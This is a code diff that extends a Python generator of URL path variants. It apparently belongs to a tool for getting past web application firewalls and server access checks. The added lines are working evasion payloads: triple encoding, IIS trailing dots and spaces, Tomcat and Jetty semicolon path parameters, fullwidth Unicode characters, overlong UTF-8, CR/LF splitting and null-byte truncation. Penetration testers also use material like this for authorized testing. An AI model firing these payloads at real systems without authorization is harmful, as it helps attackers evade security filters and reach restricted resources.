@@ -98,6 +98,8 @@ def encode_variants(path: str) -> Iterator[str]:
     yield quote(path, safe="")            # full URL encoding
     yield quote(path, safe="").lower()
     yield quote(quote(path, safe=""), safe="")  # double encoding
+    # D4 — triple encoding (some WAFs decode twice before checking)
+    yield quote(quote(quote(path, safe=""), safe=""), safe="")
     yield path.replace("/", "%2f")
     yield path.replace("/", "%2F")
     yield path.replace(".", "%2e")
@@ -107,11 +109,39 @@ def encode_variants(path: str) -> Iterator[str]:
     # IIS-specific tricks
     yield path + "::$DATA"
     yield path + "::$INDEX_ALLOCATION"
+    # D4 — Windows trailing dot/space (IIS strips them, security filter sees
+    # something different than the filesystem does)
+    yield path + "."
+    yield path + " "
+    yield path + "%20"
+    yield path + "%E2%80%8B"     # zero-width space
     # Tomcat ;jsessionid
     yield path + ";jsessionid=A"
     # Java path-trans bug
     yield path.replace("/", "/.")
     yield path.replace("/", "/.;/")
+    # D4 — semicolon path-parameter injection (Tomcat / Java EE / Jetty)
+    yield path + ";a=b"
+    yield path.replace("/", "/;/")
+    yield path.replace("/", "/;a=b/")
+    # D4 — matrix params (RFC 3986 §3.3 — some servers strip, some don't)
+    yield path + ";=;"
+    yield path.replace("/", "/x;a=b/", 1)
+    # D4 — Unicode normalization tricks (NFKC: fullwidth → ascii)
+    yield path.replace("/", "\uff0f")       # fullwidth slash
+    yield path.replace(".", "\uff0e")       # fullwidth dot
+    yield path.replace("g", "\u0261")       # latin small letter script g
+    # D4 — overlong UTF-8 of '.' (0x2e)
+    yield path.replace(".", "%c0%ae")
+    yield path.replace(".", "%e0%80%ae")
+    yield path.replace("/", "%c0%af")       # overlong '/'
+    # D4 — newline / carriage-return splitting (some WAFs split on \r\n)
+    yield path + "%0a"
+    yield path + "%0d"
+    yield path + "%0d%0a"
+    # D4 — null-byte truncation (modern langs ignore but older WAFs choke)
+    yield path + "%00.json"
+    yield path + "%00"
 
 
 def apply_path_tricks(path: str) -> Iterator[str]:
